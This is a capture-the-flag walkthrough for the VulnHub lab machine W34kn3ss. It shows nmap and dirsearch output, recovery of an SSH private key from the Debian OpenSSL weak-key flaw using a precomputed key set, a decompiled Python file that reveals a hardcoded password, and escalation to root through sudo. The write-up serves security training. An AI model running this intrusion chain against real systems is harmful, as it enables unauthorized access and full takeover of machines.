# W34kn3ss | VulnHub
https://www.vulnhub.com/entry/w34kn3ss-1,270/

### 1. Scan
```bash
Nmap scan report for 192.168.34.150
Host is up, received arp-response (0.00078s latency).
Scanned at 2021-07-15 23:06:00 EDT for 21s
Not shown: 65532 closed ports
Reason: 65532 resets
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 de:89:a2:de:45:e7:d6:3d:ef:e9:bd:b4:b6:68:ca:6d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCvkgmVahuBlxM6WUy6NSEAmWnYQbfKfrHwxT0rlZleQQ6Hyjd435lLBiA1kSyHzYxQ2l2WhiXefSycEtI8FntMjnOEFahCgobvsP5HblaUGAxmh+RPId+/U0OPwbF8WEtE2aM7ynaJ3eJt02iyHoFSTICNNiwAMX1sde/ADI2zXkssrjerwyTJLrI5JO1girvHJcJxJWvS3HFHyZbksKK6giPy7E8Q6Uz0sp5p+Qx4iqZ9kHkwwLZ+Yk56BupHZDvjDWx9Pi8qhnlwgaqUj/RbG/eEylxRtqQn2i1A6TQrWMcMTpN+P25Ws9TPV8cRiDQwEX+bx30HHgc5AQ+YDRkf
|   256 1d:98:4a:db:a2:e0:cc:68:38:93:d0:52:2a:1a:aa:96 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDyK5qz3tcYxvzJVZO2izBdS3LucZE0hUU4mOTja1WHO7Ma3plgqQoL52O+svarU9eHvf0sW5GqD02Bf+4ZQbWo=
|   256 3d:8a:6b:92:0d:ba:37:82:9e:c3:27:18:b6:01:cd:98 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEOKeds8hqs+e9SnwnrnhhoV8IRh/CUlCgMmdTroLiuG
80/tcp  open  http     syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
443/tcp open  ssl/http syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| ssl-cert: Subject: commonName=weakness.jth/organizationName=weakness.jth/stateOrProvinceName=Jordan/countryName=jo/emailAddress=n30@weakness.jth/localityName=Amman
| Issuer: commonName=weakness.jth/organizationName=weakness.jth/stateOrProvinceName=Jordan/countryName=jo/emailAddress=n30@weakness.jth/localityName=Amman
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-05-05T11:12:54
| Not valid after:  2019-05-05T11:12:54
| MD5:   f921 c4be 2c6e 89d6 adaf a7c2 8f39 a87d
| SHA-1: 0b44 5a28 c4da 0bf8 b308 a782 4081 1218 101e 0feb
| -----BEGIN CERTIFICATE-----
| MIID0DCCArigAwIBAgIJAPo2he2sLvFHMA0GCSqGSIb3DQEBCwUAMH0xCzAJBgNV
| BAYTAmpvMQ8wDQYDVQQIDAZKb3JkYW4xDjAMBgNVBAcMBUFtbWFuMRUwEwYDVQQK
| DAx3ZWFrbmVzcy5qdGgxFTATBgNVBAMMDHdlYWtuZXNzLmp0aDEfMB0GCSqGSIb3
| DQEJARYQbjMwQHdlYWtuZXNzLmp0aDAeFw0xODA1MDUxMTEyNTRaFw0xOTA1MDUx
| MTEyNTRaMH0xCzAJBgNVBAYTAmpvMQ8wDQYDVQQIDAZKb3JkYW4xDjAMBgNVBAcM
| BUFtbWFuMRUwEwYDVQQKDAx3ZWFrbmVzcy5qdGgxFTATBgNVBAMMDHdlYWtuZXNz
| Lmp0aDEfMB0GCSqGSIb3DQEJARYQbjMwQHdlYWtuZXNzLmp0aDCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBANq345qdUACB07H/jIZ+VTL3029pbwbiB2Ew
| 2ZoS0DpiIlz5Fvcd15/Diw/b2uCfXrTa7ka2wYeSP+hpipI6oKTB8+7nRuh+cugv
| bApck+17nDe7MeE30s7hO33QPHoCPrWmM6Z53vhF/ur3cyd9osKrAg9oPCXMBBKV
| e5/s+gW9c7mfn2u+tHm6nAVKScxVoFdXld0c7OKOZDqFLKK7zLPa5iHKIW9wadYC
| c71OAAA5tx5fcn4xVBjOSBQUMOqJMHER1sUMOpqrsyHme84TulgNTck24ndyiHcE
| DfkBlOaA+qWDwcxFw22NFkAeg3/ry/J6gTBrQkCRsh3Ncbgd/IsCAwEAAaNTMFEw
| HQYDVR0OBBYEFJQs/y0qng9kHtd0p7JuPc/Vq+iWMB8GA1UdIwQYMBaAFJQs/y0q
| ng9kHtd0p7JuPc/Vq+iWMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQAD
| ggEBAMDHIAbnghNdTW/dG9xLyTLkPZYsaAeKgq8B8D5HfNy5Oo7A3dUIit0fvjJv
| AFTV16v8dwWPv6mjWwf1Npzl9JNHiT+437ZO+eBn3utIwYa8nl58ZyMC2gZCo0/4
| htEK3RgIFnjU2qiBeEBHk+Z6chF4AWVtxJa+mXx4RfUPwK5+WwOUOY9QbymR8cUI
| 1qlPDrP3MTuDj8OY9ts17L/XLcyKTkX2zuDIS8wBgt+WoOCb6Hy9s4/PGYwJT5iy
| KVlQicmEiKU70In1cpPF1FSV7iLpMQXhspJADJ0lPTzc7WEpIoySpxX8SVQ8cq4b
| d07ykwyD+BS8XzcuFQgI/8ek0as=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
MAC Address: 00:0C:29:9C:D4:0B (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/15%OT=22%CT=1%CU=42072%PV=Y%DS=1%DC=D%G=Y%M=000C29%T
OS:M=60F0F7AD%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=108%TI=Z%CI=I%II=I
OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O
OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6
OS:=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=40%CD=S)

Uptime guess: 23.077 days (since Tue Jun 22 21:15:24 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.78 ms 192.168.34.150

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul 15 23:06:21 2021 -- 1 IP address (1 host up) scanned in 21.81 seconds
```
The machine is running SSH, and an Apache HTTP server on port 80 and 443. The one on port 443 has an SSL certificate for the name weakness.jth with an e-mail of n30@weakness.jth.

### 2. Enumeration
Search for directories from within the http and https servers.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ dirsearch -u http://weakness.jth -x 403                 

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10848

Error Log: /home/kali/Extra-Tools/dirsearch/logs/errors-21-07-15_23-32-16.log

Target: http://weakness.jth/

Output File: /home/kali/Extra-Tools/dirsearch/reports/weakness.jth/_21-07-15_23-32-16.txt

[23:32:16] Starting: 
[23:32:32] 200 -  526B  - /index.html                                                                                                   
[23:32:37] 301 -  314B  - /private  ->  http://weakness.jth/private/                                    
[23:32:37] 200 -   14B  - /robots.txt                                                           
                                                                                                                  
Task Completed
                                                                                                                                         
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ dirsearch -u https://weakness.jth -x 403

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10848

Error Log: /home/kali/Extra-Tools/dirsearch/logs/errors-21-07-15_23-32-47.log

Target: https://weakness.jth/

Output File: /home/kali/Extra-Tools/dirsearch/reports/weakness.jth/_21-07-15_23-32-47.txt

[23:32:47] Starting: 
[23:32:59] 301 -  313B  - /blog  ->  https://weakness.jth/blog/                                                                         
[23:32:59] 200 -  738B  - /blog/                   
[23:33:04] 200 -   11KB - /index.html                                                                          
[23:33:12] 301 -  313B  - /test  ->  https://weakness.jth/test/                                                   
[23:33:12] 200 -   72B  - /test/       
[23:33:13] 200 -  216B  - /upload.php                                                     
[23:33:13] 301 -  316B  - /uploads  ->  https://weakness.jth/uploads/
[23:33:13] 200 -  744B  - /uploads/   
                                                                                                
Task Completed
```

Starting with port 80 first, check out the /private directory which is a file server with two files: notes.txt and mykey.pub.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ wget http://weakness.jth/private/files/mykey.pub                                                            
--2021-07-15 23:11:25--  http://weakness.jth/private/files/mykey.pub
Resolving weakness.jth (weakness.jth)... 192.168.34.150
Connecting to weakness.jth (weakness.jth)|192.168.34.150|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 400
Saving to: ‘mykey.pub’

mykey.pub                                       100%[=======================================================================================================>]     400  --.-KB/s    in 0s      

2021-07-15 23:11:25 (53.1 MB/s) - ‘mykey.pub’ saved [400/400]

                                                                                                                                                                                                
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ wget http://weakness.jth/private/files/notes.txt
--2021-07-15 23:11:31--  http://weakness.jth/private/files/notes.txt
Resolving weakness.jth (weakness.jth)... 192.168.34.150
Connecting to weakness.jth (weakness.jth)|192.168.34.150|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43 [text/plain]
Saving to: ‘notes.txt’

notes.txt                                       100%[=======================================================================================================>]      43  --.-KB/s    in 0s      

2021-07-15 23:11:31 (3.88 MB/s) - ‘notes.txt’ saved [43/43]

                                                                                                                                                                                                
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ cat notes.txt mykey.pub 
this key was generated by openssl 0.9.8c-1
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguAeWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnskJJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yczZg+ZavtmfItQt1Vac1vSuBPCpTqkjE/4Iklgw== root@targetcluster
```
Interesting.

### 3. Recover the private key
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ searchsploit openssl 0.9.8c-1           
----------------------------------------------- ---------------------------------
 Exploit Title                                 |  Path
----------------------------------------------- ---------------------------------
OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Deriva | linux/remote/5622.txt
OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Deriva | linux/remote/5632.rb
OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Deriva | linux/remote/5720.py
----------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

┌──(kali㉿kali)-[]-[~/Desktop]
└─$ searchsploit -x 5622 | cat   
  Exploit: OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force SSH
      URL: https://www.exploit-db.com/exploits/5622
     Path: /usr/share/exploitdb/exploits/linux/remote/5622.txt
File Type: ASCII text, with CRLF line terminators

the debian openssl issue leads that there are only 65.536 possible ssh 
keys generated, cause the only entropy is the pid of the process 
generating the key.

This leads to that the following perl script can be used with the 
precalculated ssh keys to brute force the ssh login. It works if such a 
keys is installed on a non-patched debian or any other system manual 
configured to.
```

Clone the key repo.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ git clone https://github.com/g0tmi1k/debian-ssh
Cloning into 'debian-ssh'...
remote: Enumerating objects: 35, done.
remote: Total 35 (delta 0), reused 0 (delta 0), pack-reused 35
Receiving objects: 100% (35/35), 439.59 MiB | 2.25 MiB/s, done.
Resolving deltas: 100% (8/8), done.
Updating files: 100% (13/13), done.
```

Unzip the files - in this case the key is seen to be RSA.
```bash
┌──(kali㉿kali)-[]-[~/Desktop/debian-ssh/common_keys]
└─$ tar xvf debian_ssh_rsa_2048_x86.tar 
rsa/
rsa/2048/
rsa/2048/2712a6d5cec99f295a0c468b830a370d-28940.pub
rsa/2048/eaddc9bba9bf3c0832f443706903cd14-28712.pub
...
```

Grep in the key folder for a portion of the public key.
```bash
┌──(kali㉿kali)-[]-[~/…/debian-ssh/common_keys/rsa/2048]
└─$ grep -lr 'AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo'                                                                  
4161de56829de2fe64b9055711f531c1-2537.pub

┌──(kali㉿kali)-[]-[~/…/debian-ssh/common_keys/rsa/2048]
└─$ mv 4161de56829de2fe64b9055711f531c1-2537 ~/Desktop/id_rsa
```

### 4. Get a shell
Tried to login with root, however it doesn't work. Then we remember there is a potential username thanks to the SSL certificate.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ ssh -i id_rsa n30@weakness.jth 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Tue Aug 14 13:29:20 2018 from 192.168.209.1
n30@W34KN3SS:~$ whoami
n30
n30@W34KN3SS:~$ id
uid=1000(n30) gid=1000(n30) groups=1000(n30),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
```

### 5. Enumerate from user
Right in the user's home directory is a file called "code".
```bash
n30@W34KN3SS:~$ ls
code  user.txt
n30@W34KN3SS:~$ file code
code: python 2.7 byte-compiled
n30@W34KN3SS:~$ ls -l code
-rwxrwxr-x 1 n30 n30 1138 May  8  2018 code
```
Copied this file to my machine via SCP to do some analysis.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ scp -i id_rsa n30@weakness.jth:code .
                                                                                                                                         
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ strings code                                                          
[+]System Started at : {0}sG
[+]This binary should generate unique hash for the hardcoded login infos
[+]Generating the hash ..t
[+]Your new hash is : {0}s
[+]Done(
sockett
timet
hashlibt
formatt
ctimet
inft
chrt
ordt
sha256t
hexdigestt
hashf(
code.pyt
<module>

┌──(kali㉿kali)-[]-[~/Desktop]
└─$ ./code      
[+]System Started at : Thu Jul 15 23:46:58 2021
[+]This binary should generate unique hash for the hardcoded login info
[+]Generating the hash ..
[+]Your new hash is : 898592c37f40d385c96760039d1bc793e3a930af30a0857867b3d96838d43d0e
[+]Done
                                                                                                                                         
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ ./code
[+]System Started at : Thu Jul 15 23:47:52 2021
[+]This binary should generate unique hash for the hardcoded login info
[+]Generating the hash ..
[+]Your new hash is : 291c7eaaab76755a6712b8a7d3886860254ce263986427e7d2b6ad3b8aa613bd
[+]Done
```
No idea what to make of this. It's hashing with some sort of salt, possibly with a timestamp because of "ctimet" in strings. If the creds really are hardcoded, there should be some way to recover them from this file.

### 6. Decompile the pyc file
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ mv code code.pyc

┌──(kali㉿kali)-[]-[~/Desktop]
└─$ python2-docker "python -m pip install uncompyle6; uncompyle6 code.pyc"
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. A future version of pip will drop support for Python 2.7. More details about Python 2 support in pip, can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support
Collecting uncompyle6
  Downloading uncompyle6-3.7.4-py2-none-any.whl (316 kB)
     |████████████████████████████████| 316 kB 3.2 MB/s 
Collecting spark-parser<1.9.0,>=1.8.9
  Downloading spark_parser-1.8.9-py2-none-any.whl (17 kB)
Collecting xdis<5.1.0,>=5.0.4
  Downloading xdis-5.0.11-py2.py3-none-any.whl (129 kB)
     |████████████████████████████████| 129 kB 5.6 MB/s 
Collecting click
  Downloading click-7.1.2-py2.py3-none-any.whl (82 kB)
     |████████████████████████████████| 82 kB 1.5 MB/s 
Collecting six>=1.10.0
  Downloading six-1.16.0-py2.py3-none-any.whl (11 kB)
Installing collected packages: click, spark-parser, six, xdis, uncompyle6
Successfully installed click-7.1.2 six-1.16.0 spark-parser-1.8.9 uncompyle6-3.7.4 xdis-5.0.11
WARNING: You are using pip version 20.0.2; however, version 20.3.4 is available.
You should consider upgrading via the '/usr/local/bin/python -m pip install --upgrade pip' command.
# uncompyle6 version 3.7.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 19:51:05) 
# [GCC 9.2.0]
# Embedded file name: code.py
# Compiled at: 2018-05-08 15:50:54
import os, socket, time, hashlib
print ('[+]System Started at : {0}').format(time.ctime())
print '[+]This binary should generate unique hash for the hardcoded login info'
print '[+]Generating the hash ..'
inf = ''
inf += chr(ord('n'))
inf += chr(ord('3'))
inf += chr(ord('0'))
inf += chr(ord(':'))
inf += chr(ord('d'))
inf += chr(ord('M'))
inf += chr(ord('A'))
inf += chr(ord('S'))
inf += chr(ord('D'))
inf += chr(ord('N'))
inf += chr(ord('B'))
inf += chr(ord('!'))
inf += chr(ord('!'))
inf += chr(ord('#'))
inf += chr(ord('B'))
inf += chr(ord('!'))
inf += chr(ord('#'))
inf += chr(ord('!'))
inf += chr(ord('#'))
inf += chr(ord('3'))
inf += chr(ord('3'))
hashf = hashlib.sha256(inf + time.ctime()).hexdigest()
print ('[+]Your new hash is : {0}').format(hashf)
print '[+]Done'
# okay decompiling code.pyc
```
There it is. The full credentials for n30 is: `n30:dMASDNB!!#B!#!#33`

### 7. Escalate to root
With the password recovered, checking sudo permissions shows the user can run any command as root.
```bash
n30@W34KN3SS:~$ sudo -l
[sudo] password for n30: 
Matching Defaults entries for n30 on W34KN3SS:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User n30 may run the following commands on W34KN3SS:
    (ALL : ALL) ALL
```
From here, escalate to root.
```bash
n30@W34KN3SS:~$ sudo -i
root@W34KN3SS:~# whoami
root
```